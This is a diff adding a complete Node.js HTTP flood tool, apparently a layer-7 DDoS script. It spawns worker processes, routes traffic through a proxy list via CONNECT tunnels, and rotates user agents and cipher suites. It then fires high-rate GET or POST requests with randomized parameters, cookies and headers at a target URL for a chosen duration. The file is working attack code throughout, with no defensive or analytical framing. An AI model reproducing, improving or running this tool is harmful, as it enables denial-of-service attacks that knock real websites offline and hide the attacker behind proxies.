@@ -1,0 +1,388 @@
+process.on('uncaughtException', function(er) {
+    //console.error(er)
+});
+process.on('unhandledRejection', function(er) {
+    //console.error(er)
+});
+require('events').EventEmitter.defaultMaxListeners = 0;
+const fs = require('fs');
+const randstr = require('randomstring')
+const url = require('url');
+
+var path = require("path");
+const cluster = require('cluster');
+
+function ra() {
+    const rsdat = randstr.generate({
+        "charset":"0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
+        "length":4
+    });
+    return rsdat;
+}
+
+let headerbuilders;
+
+let COOKIES = undefined;
+let POSTDATA = undefined;
+
+var fileName = __filename;
+var file = path.basename(fileName);
+let randomparam = false;
+process.argv.forEach((ss) => {
+    if (ss.includes("cookie=")){
+        COOKIES = ss.slice(7);
+    } else if (ss.includes("postdata=")){
+        if (process.argv[2].toUpperCase() != "POST"){
+            console.error("Method Invalid (Has Postdata But Not POST Method)")
+            process.exit(1);
+        }
+        POSTDATA = ss.slice(9);
+    } else if (ss.includes("randomstring=")){
+        randomparam = ss.slice(13);
+        console.log("(!) Custom RandomString");
+    } else if (ss.includes("headerdata=")){
+        headerbuilders = "";
+        const hddata = ss.slice(11).split('""')[0].split("&");
+        for (let i = 0; i < hddata.length; i++) {
+            const head = hddata[i].split("=")[0];
+            const dat = hddata[i].split("=")[1];
+            headerbuilders += `\r\n${head}: ${dat}`
+        }
+    }
+});
+if (COOKIES !== undefined){
+    console.log("(!) Custom Cookie Mode");
+} else {
+    COOKIES = ""
+}
+if (headerbuilders !== undefined){
+    console.log("(!) Custom HeaderData Mode");
+}
+if (POSTDATA !== undefined){
+    console.log("(!) Custom PostData Mode");
+} else {
+    POSTDATA = ""
+}
+
+if (cluster.isMaster){
+    for (let i = 0; i < process.argv[7]; i++){
+        cluster.fork();
+        console.log(`(!) Threads ${i} Started Attacking`);
+    }
+    console.log("(!) Attack Started For " + process.argv[5] + " Seconds!")
+
+    setTimeout(() => {
+        process.exit(1);
+    }, process.argv[5] * 1000);
+} else {
+    startflood();
+}
+
+var proxies = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n');
+var rate = process.argv[6];
+var target_url = process.argv[3];
+const target = target_url.split('""')[0];
+
+var parsed = url.parse(target);
+process.setMaxListeners(0);
+
+const cplist = [
+    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
+];
+
+const UAs = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0",
+    "Opera/9.80 (Android; Opera Mini/7.5.54678/28.2555; U; ru) Presto/2.10.289 Version/12.02",
+    "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
+    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; Trident/6.0; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
+    "Mozilla/5.0 (Android 11; Mobile; rv:99.0) Gecko/99.0 Firefox/99.0",
+    "Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/99.0.4844.59 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 10; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
+	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
+    "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)",	
+	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
+	"Mozilla/5.0 (Amiga; U; AmigaOS 1.3; en; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14",
+    "Mozilla/5.0 (AmigaOS; U; AmigaOS 1.3; en-US; rv:1.8.1.21) Gecko/20090303 SeaMonkey/1.1.15",
+    "Mozilla/5.0 (AmigaOS; U; AmigaOS 1.3; en; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14",
+    "Mozilla/5.0 (Android 2.2; Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
+    "Mozilla/5.0 (BeOS; U; BeOS BeBox; fr; rv:1.9) Gecko/2008052906 BonEcho/2.0",
+    "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.1) Gecko/20061220 BonEcho/2.0.0.1",
+    "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.10) Gecko/20071128 BonEcho/2.0.0.10",
+    "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.17) Gecko/20080831 BonEcho/2.0.0.17",
+    "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.6) Gecko/20070731 BonEcho/2.0.0.6",
+    "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7",
+    "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1b2) Gecko/20060901 Firefox/2.0b2",
+    "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1",
+    "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20060702 SeaMonkey/1.5a",
+    "Mozilla/5.0 (BeOS; U; Haiku BePC; en-US; rv:1.8.1.10pre) Gecko/20080112 SeaMonkey/1.1.7pre",
+    "Mozilla/5.0 (BeOS; U; Haiku BePC; en-US; rv:1.8.1.14) Gecko/20080429 BonEcho/2.0.0.14",
+    "Mozilla/5.0 (BeOS; U; Haiku BePC; en-US; rv:1.8.1.17) Gecko/20080831 BonEcho/2.0.0.17",
+    "Mozilla/5.0 (BeOS; U; Haiku BePC; en-US;rv:1.8.1.18) Gecko/20081114 BonEcho/2.0.0.18",
+    "Mozilla/5.0 (BeOS; U; Haiku BePC; en-US; rv:1.8.1.21pre) Gecko/20090218 BonEcho/2.0.0.21pre",
+    "Mozilla/5.0 (Darwin; FreeBSD 5.6; en-GB; rv:1.8.1.17pre) Gecko/20080716 K-Meleon/1.5.0",
+    "Mozilla/5.0 (Darwin; FreeBSD 5.6; en-GB; rv:1.9.1b3pre)Gecko/20081211 K-Meleon/1.5.2",
+    "Mozilla/5.0 (Future Star Technologies Corp.; Star-Blade OS; x86_64; U; en-US) iNet Browser 4.7",
+    "Mozilla/5.0 (Linux 2.4.18-18.7.x i686; U) Opera 6.03 [en]",
+    "Mozilla/5.0 (Linux 2.4.18-ltsp-1 i686; U) Opera 6.1 [en]",
+    "Mozilla/5.0 (Linux 2.4.19-16mdk i686; U) Opera 6.11 [en]",
+    "Mozilla/5.0 (Linux 2.4.21-0.13mdk i686; U) Opera 7.11 [en]",
+    "Mozilla/5.0 (Linux X86; U; Debian SID; it; rv:1.9.0.1) Gecko/2008070208 Debian IceWeasel/3.0.1",
+    "Mozilla/5.0 (Linux i686 ; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.70",
+    "Mozilla/5.0 (Linux i686; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0",
+    "Mozilla/5.0 (Linux i686; U; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
+    "Mozilla/5.0 (Linux) Gecko Iceweasel (Debian) Mnenhy",
+    "Mozilla/5.0 (Linux; U) Opera 6.02 [en]",
+    "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13",
+    "Mozilla/5.0 (MSIE 7.0; Macintosh; U; SunOS; X11; gu; SV1; InfoPath.2; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
+    "Mozilla/5.0 (Macintosh; ; Intel Mac OS X; fr; rv:1.8.1.1) Gecko/20061204 Opera",
+    "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 11_7_9; de-LI; rv:1.9b4) Gecko/2012010317 Firefox/10.0a4",
+    "Mozilla/5.0 (Macintosh; I; PPC Mac OS X Mach-O; en-US; rv:1.9a1) Gecko/20061204 Firefox/3.0a1",
+    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.12) Gecko/20080206 Firefox/2.0.0.12 Navigator/9.0.0.6",
+    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11",
+    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.12) Gecko/20080206 Firefox/2.0.0.12",
+    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; fr; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12",
+    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; fr; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9",
+    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; en) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22",
+    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.9.0.16) Gecko/2009120123 Firefox/3.0.16 Flock/2.5.6",
+    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.9.0.8) Gecko/2009032608 Firefox/3.0.8",
+    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5",
+    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; fr; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12",
+    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5",
+    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/419 (KHTML, like Gecko) Safari/419.3",
+    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/418.9.1 (KHTML, like Gecko) Safari/419.3",
+    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; it-it) AppleWebKit/418.8 (KHTML, like Gecko) Safari/419.3",
+    "Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412.EU",
+    "Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412.EU",
+    "Mozilla/5.0 (Nintendo 3DS; U; en) Version/1.7412.EU",
+    "Mozilla/5.0 (Nintendo 3DS; U; en) Version/1.7412.EU",
+    "Mozilla/5.0 (Nintendo 3DS; U; en) Version/1.7412.JP",
+    "Mozilla/5.0 (Nintendo 3DS; U; en) Version/1.7412.JP",
+    "Mozilla/5.0 (Nintendo 3DS; U; en) Version/1.7412.NA",
+    "Mozilla/5.0 (Nintendo 3DS; U; en) Version/1.7412.NA",
+    "Mozilla/5.0 (Nintendo 3DS; U; en) Version/1.7412.NZ",
+    "Mozilla/5.0 (Nintendo 3DS; U; en) Version/1.7412.NZ",
+    "Mozilla/5.0 (Nintendo 3DS; U; es) Version/1.7412.EU",
+    "Mozilla/5.0 (Nintendo 3DS; U; fr) Version/1.7412.EU",
+    "Mozilla/5.0 (Nintendo 3DS; U; it) Version/1.7412.EU",
+    "Mozilla/5.0 (Nintendo 3DS; U; ja) Version/1.7412.EU",
+    "Mozilla/5.0 (Nintendo 3DS; U; zh-cn) Version/1.7412.EU",
+];
+
+function startflood(){
+    if (process.argv[2].toUpperCase() == "POST"){
+        if (randomparam){
+            setInterval(() => {
+
+                var cipper = cplist[Math.floor(Math.random() * cplist.length)];
+
+                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
+                proxy = proxy.split(':');
+            
+                var http = require('http'),
+                    tls = require('tls');
+            
+                var req = http.request({ 
+                    //set proxy session
+                    host: proxy[0],
+                    port: proxy[1],
+                    ciphers: cipper,
+                    method: 'CONNECT',
+                    path: parsed.host + ":443"
+                }, (err) => {
+                    req.end();
+                    return;
+                });
+            
+                req.on('connect', function (res, socket, head) { 
+                        //open raw request
+                        var tlsConnection = tls.connect({
+                            host: parsed.host,
+                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                            secureProtocol: 'TLSv1_2_method',
+                            servername: parsed.host,
+                            secure: true,
+                            rejectUnauthorized: false,
+                            socket: socket
+                        }, function () {
+                            for (let j = 0; j < rate; j++) {
+                                tlsConnection.write("POST" + ' ' + `${parsed.path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nContent-Type: text/plain' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n' + `${(POSTDATA !== undefined) ? POSTDATA.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
+                            }
+                            // tlsConnection.end();
+                            // tlsConnection.destroy();
+                        });
+                
+                        tlsConnection.on('error', function(data) {
+                            tlsConnection.end();
+                            tlsConnection.destroy();
+                        });
+                
+                        tlsConnection.on('data', function (data) {
+                            return;
+                        });
+                    });
+                    req.end();
+                });
+        } else {
+            setInterval(() => {
+
+                var cipper = cplist[Math.floor(Math.random() * cplist.length)];
+
+                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
+                proxy = proxy.split(':');
+            
+                var http = require('http'),
+                    tls = require('tls');
+            
+                var req = http.request({ 
+                    //set proxy session
+                    host: proxy[0],
+                    port: proxy[1],
+                    ciphers: cipper,
+                    method: 'CONNECT',
+                    path: parsed.host + ":443"
+                }, (err) => {
+                    req.end();
+                    return;
+                });
+            
+                req.on('connect', function (res, socket, head) { 
+                        //open raw request
+                        var tlsConnection = tls.connect({
+                            host: parsed.host,
+                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                            secureProtocol: 'TLSv1_2_method',
+                            servername: parsed.host,
+                            secure: true,
+                            rejectUnauthorized: false,
+                            socket: socket
+                        }, function () {
+                            for (let j = 0; j < rate; j++) {
+                                tlsConnection.write("POST" + ' ' + parsed.path.replace("%RAND%",ra()) + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nContent-Type: text/plain' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n' + `${(POSTDATA !== undefined) ? POSTDATA.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
+                            }
+                            // tlsConnection.end();
+                            // tlsConnection.destroy();
+                        });
+                
+                        tlsConnection.on('error', function(data) {
+                            tlsConnection.end();
+                            tlsConnection.destroy();
+                        });
+                
+                        tlsConnection.on('data', function (data) {
+                            return;
+                        });
+                    });
+                    req.end();
+                });
+        }
+    } else if (process.argv[2].toUpperCase() == "GET"){
+        if (randomparam) {
+            setInterval(() => {
+
+                var cipper = cplist[Math.floor(Math.random() * cplist.length)];
+
+                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
+                proxy = proxy.split(':');
+            
+                var http = require('http'),
+                    tls = require('tls');
+            
+                var req = http.request({ 
+                    //set proxy session
+                    host: proxy[0],
+                    port: proxy[1],
+                    ciphers: cipper,
+                    method: 'CONNECT',
+                    path: parsed.host + ":443"
+                }, (err) => {
+                    req.end();
+                    return;
+                });
+            
+                req.on('connect', function (res, socket, head) { 
+                        //open raw request
+                        var tlsConnection = tls.connect({
+                            host: parsed.host,
+                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                            secureProtocol: 'TLSv1_2_method',
+                            servername: parsed.host,
+                            secure: true,
+                            rejectUnauthorized: false,
+                            socket: socket
+                        }, function () {
+                            for (let j = 0; j < rate; j++) {
+                                tlsConnection.write("GET" + ' ' + `${parsed.path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
+                            }
+                            // tlsConnection.end();
+                            // tlsConnection.destroy();
+                        });
+                
+                        tlsConnection.on('error', function(data) {
+                            tlsConnection.end();
+                            tlsConnection.destroy();
+                        });
+                    });
+                    req.end();
+                });
+        } else {
+            setInterval(() => {
+
+                var cipper = cplist[Math.floor(Math.random() * cplist.length)];
+
+                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
+                proxy = proxy.split(':');
+            
+                var http = require('http'),
+                    tls = require('tls');
+            
+                var req = http.request({ 
+                    //set proxy session
+                    host: proxy[0],
+                    port: proxy[1],
+                    ciphers: cipper,
+                    method: 'CONNECT',
+                    path: parsed.host + ":443"
+                }, (err) => {
+                    req.end();
+                    return;
+                });
+            
+                req.on('connect', function (res, socket, head) { 
+                        //open raw request
+                        var tlsConnection = tls.connect({
+                            host: parsed.host,
+                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                            secureProtocol: 'TLSv1_2_method',
+                            servername: parsed.host,
+                            secure: true,
+                            rejectUnauthorized: false,
+                            socket: socket
+                        }, function () {
+                            for (let j = 0; j < rate; j++) {
+                                tlsConnection.write("GET" + ' ' + `${parsed.path.replace("%RAND%",ra())}` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
+                            }
+                            // tlsConnection.end();
+                            // tlsConnection.destroy();
+                        });
+                
+                        tlsConnection.on('error', function(data) {
+                            tlsConnection.end();
+                            tlsConnection.destroy();
+                        });
+                        tlsConnection.on('data', function(data) {
+                        });
+                    });
+                    req.end();
+                });
+        }
+    }
+}
